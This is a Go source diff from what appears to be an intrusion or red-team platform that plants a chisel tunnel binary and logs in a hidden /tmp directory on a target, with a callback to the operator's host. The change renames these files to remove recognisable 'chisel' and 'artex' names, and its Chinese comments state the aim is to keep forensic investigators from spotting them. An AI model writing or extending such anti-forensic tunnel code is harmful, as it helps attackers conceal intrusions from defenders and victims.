@@ -37,7 +37,7 @@ type Plan struct {
 	ServerArgs   []string `json:"server_args"` // chisel server 参数（不含 auth)
 	ServerPID    int      `json:"server_pid,omitempty"`
 	ServerLog    string   `json:"server_log"`
-	RemoteDir    string   `json:"remote_dir"` // 目标侧 /tmp/.artex-<rand>
+	RemoteDir    string   `json:"remote_dir"` // 目标侧 /tmp/.<rand>(无前缀随机，批 7 P0-3)
 	RemoteBin    string   `json:"remote_bin"`
 	RemoteLog    string   `json:"remote_log"`
 	RemotePID    int      `json:"remote_pid,omitempty"`
@@ -118,11 +118,11 @@ func (o *PlanOpts) base(kind string) (*Plan, error) {
 		PlatformAddr: net.JoinHostPort(o.CallbackHost, strconv.Itoa(listenPort)),
 		AuthUser:     user,
 		AuthPass:     pass,
-		AuthFile:     dir + "/chisel-" + tag + ".authfile",
-		ServerLog:    dir + "/chisel-" + tag + ".server.log",
-		RemoteDir:    "/tmp/.artex-" + tag,
-		RemoteBin:    "/tmp/.artex-" + tag + "/ch",
-		RemoteLog:    "/tmp/.artex-" + tag + "/run.log",
+		AuthFile:     dir + "/" + tag + ".auth",    // 批 7 P1-4:平台侧文件去 "chisel" 特征名(防取证者一眼认出)
+		ServerLog:    dir + "/" + tag + ".run.log", // 同上:无语义名,随机 tag 已保证唯一
+		RemoteDir:    "/tmp/." + tag,
+		RemoteBin:    "/tmp/." + tag + "/ch",
+		RemoteLog:    "/tmp/." + tag + "/run.log",
 		VerifyAddr:   o.VerifyAddr,
 	}, nil
 }
